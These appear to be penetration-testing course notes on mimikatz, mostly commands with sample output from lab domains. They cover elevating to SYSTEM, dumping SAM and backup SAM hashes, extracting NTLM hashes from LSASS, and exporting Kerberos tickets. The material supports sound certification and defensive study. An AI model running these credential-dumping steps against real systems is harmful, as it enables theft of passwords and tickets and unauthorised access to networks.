
https://github.com/gentilkiwi/mimikatz/releases


In my tools
```
┌──(kali㉿kali)-[~/AssemblingthePieces/beyond]
└─$ ls /home/kali/tools/mimikatz/mimikatz_trunk/x64 
mimidrv.sys  mimikatz.exe  mimilib.dll  mimispool.dll
```

## privilege::debug
```
mimikatz # privilege::debug
Privilege '20' OK
```

## token::elevate
```
mimikatz # token::elevate
Token Id  : 0
User name : 
SID name  : NT AUTHORITY\SYSTEM

620     {0;000003e7} 1 D 41588          NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Primary
 -> Impersonated !
 * Process Token : {0;000003e7} 0 D 7434874     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,31p)       Primary
 * Thread Token  : {0;000003e7} 1 D 7498134     NT AUTHORITY\SYSTEM     S-1-5-18        (04g,21p)       Impersonation (Delegation)
```

## Dumping sam
```
lsadump::sam
Domain : MS01
SysKey : a5403534b0978445a2df2d30d19a7980
Local SID : S-1-5-21-2114389728-3978811169-1968162427
```

## Dumping password hash for current user --> sekurlsa::logonpasswords

```
 mimikatz # sekurlsa::logonpasswords
 Authentication Id : 0 ; 247563 (00000000:0003c70b)
Session           : Interactive from 1
User Name         : celia.almeda
Domain            : OSCP
Logon Server      : DC01
Logon Time        : 6/12/2024 3:55:31 AM
SID               : S-1-5-21-2610934713-1581164095-2706428072-1105
        msv :
         [00000003] Primary
         * Username : celia.almeda
         * Domain   : OSCP
         * NTLM     : e728ecbadfb02f51ce8eed753f3ff3fd
         * SHA1     : 8cb61017910862af238631bf7aaae38df64998cd
         * DPAPI    : f3ad0317c20e905dd62889dd51e7c52f
        tspkg :
        wdigest :
         * Username : celia.almeda
         * Domain   : OSCP
         * Password : (null)
        kerberos :
         * Username : celia.almeda
         * Domain   : OSCP.EXAM
         * Password : (null)
        ssp :
        credman :
        cloudap :

```


## TGTs and TGs are stored in LSASS:
```
sekurlsa::tickets /export
```

show the tickets that are stored in memory by entering sekurlsa::tickets.
```
mimikatz # sekurlsa::tickets

Authentication Id : 0 ; 656588 (00000000:000a04cc)
Session           : RemoteInteractive from 2
User Name         : jeff
Domain            : CORP
Logon Server      : DC1
Logon Time        : 9/13/2022 2:43:31 AM
SID               : S-1-5-21-1987370270-658905905-1781884369-1105

         * Username : jeff
         * Domain   : CORP.COM
         * Password : (null)

        Group 0 - Ticket Granting Service
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:59:47 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : cifs ; web04.corp.com ; @ CORP.COM
           Target Name  (02) : cifs ; web04.corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM
           Flags 40a10000    : name_canonicalize ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             38dba17553c8a894c79042fe7265a00e36e7370b99505b8da326ff9b12aaf9c7
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]
         [00000001]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Target Name  (02) : LDAP ; DC1.corp.com ; corp.com ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40a50000    : name_canonicalize ; ok_as_delegate ; pre_authent ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             c44762f3b4755f351269f6f98a35c06115a53692df268dead22bc9f06b6b0ce5
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 3        [...]

        Group 1 - Client Ticket ?

        Group 2 - Ticket Granting Ticket
         [00000000]
           Start/End/MaxRenew: 9/13/2022 2:43:56 AM ; 9/13/2022 12:43:56 PM ; 9/20/2022 2:43:56 AM
           Service Name (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Target Name  (02) : krbtgt ; CORP.COM ; @ CORP.COM
           Client Name  (01) : jeff ; @ CORP.COM ( CORP.COM )
           Flags 40e10000    : name_canonicalize ; pre_authent ; initial ; renewable ; forwardable ;
           Session Key       : 0x00000001 - des_cbc_crc
             bf25fbd514710a98abaccdf026b5ad14730dd2a170bca9ded7db3fd3b853892a
           Ticket            : 0x00000012 - aes256_hmac       ; kvno = 2        [...]
...
```

    Listing 5 - Extracting Kerberos tickets with mimikatz

The output shows both a TGT and a TGS. Stealing a TGS would allow us to access only particular resources associated with those tickets. 
## Getting hashes from SAM and SYSTEM of different location like backup or windows.old
```
lsadump::sam /system:C:\windows.old\Windows\System32\SYSTEM /sam:C:\windows.old\Windows\System32\SAM
```